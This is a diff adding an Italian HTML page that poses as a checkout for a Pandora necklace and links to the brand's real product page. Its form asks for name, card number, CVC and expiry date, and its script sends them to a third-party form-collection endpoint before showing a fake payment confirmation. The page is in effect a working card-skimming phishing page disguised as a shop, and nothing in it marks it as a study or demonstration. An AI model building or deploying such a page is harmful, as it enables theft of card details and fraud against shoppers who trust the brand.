@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <title>Acquista Collana Pandora</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f3ee;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(167,140,105,0.2);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      position: relative;
+    }
+    h2 {
+      color: #6b523d;
+      margin-bottom: 25px;
+      font-family: 'Montserrat', sans-serif;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      margin-bottom: 15px;
+      border: 1.5px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-family: 'Roboto', sans-serif;
+    }
+    button {
+      background-color: #a78c69;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-family: 'Montserrat', sans-serif;
+      cursor: pointer;
+      width: 100%;
+      font-size: 1.1rem;
+    }
+    button:hover {
+      background-color: #6b523d;
+    }
+    .link-pandora {
+      display: inline-block;
+      margin-bottom: 25px;
+      color: #a78c69;
+      text-decoration: none;
+      font-weight: 600;
+      font-family: 'Montserrat', sans-serif;
+    }
+    .link-pandora:hover {
+      color: #6b523d;
+    }
+    #thankyou-message {
+      display: none;
+      font-size: 1.3rem;
+      color: #6b523d;
+      font-weight: 700;
+      margin-top: 20px;
+      font-family: 'Montserrat', sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Collana Pandora</h2>
+    <a href="https://it.pandora.net/it/collane/catenine/collana-a-catenina/590412.html?c_priceTestGroup=experienceTest_segmentB"
+       target="_blank" rel="noopener noreferrer" class="link-pandora">
+      Visualizza la collana su Pandora
+    </a>
+
+    <form id="payment-form" action="https://formspree.io/f/xjkrolnk" method="POST">
+      <label for="nome">Nome utente</label>
+      <input type="text" id="nome" name="nome" placeholder="Inserisci il tuo nome" required />
+
+      <label for="carta">Numero carta</label>
+      <input type="text" id="carta" name="carta" placeholder="1234 5678 9012 3456" required />
+
+      <label for="cvc">CVC</label>
+      <input type="text" id="cvc" name="cvc" placeholder="3 cifre" maxlength="3" pattern="\d{3}" title="Inserisci 3 numeri" required />
+
+      <label for="scadenza">Data scadenza</label>
+      <input type="text" id="scadenza" name="scadenza" placeholder="MM/AA" pattern="(0[1-9]|1[0-2])\/\d{2}" title="Formato MM/AA" required />
+
+      <button type="submit">Vai al pagamento</button>
+    </form>
+
+    <div id="thankyou-message">Grazie per il pagamento!</div>
+  </div>
+
+  <script>
+    const form = document.getElementById('payment-form');
+    const thankYou = document.getElementById('thankyou-message');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      fetch(form.action, {
+        method: form.method,
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+      }).then(response => {
+        if (response.ok) {
+          form.style.display = 'none';
+          thankYou.style.display = 'block';
+        } else {
+          alert('C\'è stato un problema, riprova più tardi.');
+        }
+      }).catch(() => {
+        alert('C\'è stato un problema di rete, riprova più tardi.');
+      });
+    });
+  </script>
+</body>
+</html>
